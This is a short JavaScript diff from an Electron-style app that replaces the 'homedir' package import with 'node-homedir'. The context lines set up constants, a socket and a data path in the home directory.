@@ -5,7 +5,7 @@ var fs = require("fs-extra");
 const CONSTANTS = require(__dirname + '/assets/js/Constants')
 var ORDER = CONSTANTS.order;
 var socket = remote.getCurrentWebContents().victim;
-var homeDir = require('homedir');
+var homeDir = require('node-homedir');
 var path = require("path");
 
 var dataPath = path.join(homeDir(), CONSTANTS.dataDir);
